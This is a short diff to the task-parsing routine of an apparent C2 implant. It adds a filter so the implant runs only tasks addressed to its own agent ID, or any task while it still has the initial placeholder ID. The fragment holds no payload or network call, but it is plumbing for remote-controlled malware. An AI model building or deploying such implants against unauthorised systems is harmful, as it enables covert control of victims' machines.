@@ -149,6 +149,8 @@ void Implant::parseTasks(const std::string& response) {
     // Range based for-loop to parse tasks and push them into the tasks vector
     // Once this is done, the tasks are ready to be serviced by the implant
     for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
+        // Ensure that each task is meant for this agent by checking if this agent's id is in the task object, or assume initialization
+        if (taskTreeValue.get_child("agent_id").get_value<std::string>() == agent_id || agent_id == "MA==")
         // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
         {
             tasks.push_back(
@@ -157,6 +159,10 @@ void Implant::parseTasks(const std::string& response) {
                     setRunning(configuration.isRunning);
                     setAgentID(configuration.agent_id); })
             );
+        }
+        else {
+            std::cout << "\nRetrieved task for other agent.\nNot executing." << std::endl;
+            std::cout << "\n================================================\n" << std::endl;
         }
     }
 }
